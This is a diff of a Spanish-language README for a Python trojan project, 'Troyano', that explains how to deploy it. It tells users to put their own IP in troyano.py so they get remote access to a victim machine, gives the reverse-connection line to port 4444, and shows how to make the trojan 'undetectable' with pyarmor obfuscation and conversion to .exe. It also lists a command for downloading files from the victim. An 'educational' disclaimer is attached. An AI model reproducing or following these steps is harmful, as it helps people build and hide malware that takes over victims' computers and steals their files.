@@ -1,56 +1,60 @@
 # Troyano
 
 <p align="center">
-<img src="Logotipo.png">
+  <img src="./Img/Logo.png" height="300px" width="350px">
 </p>
 
-Un troyano es un tipo de software malicioso que se disfraza de una aplicación legítima o atractiva para engañar a los usuarios y ganar acceso no autorizado a sus sistemas o dispositivos.
+Un **troyano** es un tipo de software malicioso que se disfraza de una aplicación legítima para engañar a los usuarios y obtener acceso no autorizado a sus sistemas. Este proyecto está diseñado únicamente con fines **educativos y de investigación en ciberseguridad**.
 
-### Instalación
+---
 
-Descargar el repositorio de Github luego configurar el script **troyano.py** con tu IP publica para poder tener acceso remoto a la maquina victima
+## ⚙️ Instalación
+
+Descarga el repositorio y configura el script `troyano.py` con tu IP pública para establecer la conexión remota:
 
 ```python
 conexion.connect(("192.168.1.10", 4444))
 ```
 
+---
 
-### Ofuscacion
+## 🔒 Ofuscación
 
-Para hacer indetectable el troyano deberes instalar **pyarmor**
+Para hacer indetectable el troyano, instala **pyarmor**:
 
-```
+```bash
 pip install pyarmor
 ```
 
-Ahora ofuscamos el troyano con el siguiente comando:
+Ofusca el script:
 
-```
+```bash
 pyarmor gen troyano.py
 ```
 
-Luego de esto nos creara una carpeta Dist con el troyano ofuscado, por ultimo convertiremos **.py** a **.exe** con auto-py-to-exe.
+Esto generará una carpeta `Dist` con el troyano ofuscado.  
+Luego convierte el archivo `.py` a `.exe` con **auto-py-to-exe**:
 
-```
+```bash
 pip install auto-py-to-exe
 ```
 
-<p align="center">
-<img src="./Img/virustotal.png">
-</p>
+---
 
-### USO
+## ▶️ Uso
 
-Puedes descargar archivos con el siguiente comando:
+Ejemplo de comando disponible:
 
-```
+```bash
 download <nombre de archivo>
 ```
 
-### ⚠️ **Aviso**
+<p align="center">
+  <img src="./Img/virustotal.png">
+</p>
 
-Este script ha sido desarrollado únicamente con fines **educativos y de investigación en ciberseguridad**.
+---
 
-No me responsabilizo del mal uso que se pueda dar ni de los daños que puedan ocasionarse por su ejecución.
+## ⚠️ Aviso legal
 
-El uso indebido de este material puede ser **ilegal**.
+Este script ha sido desarrollado únicamente con fines **educativos y de investigación en ciberseguridad**. El uso indebido de este material puede ser **ilegal**. No me responsabilizo del mal uso ni de los daños que puedan ocasionarse por su ejecución.
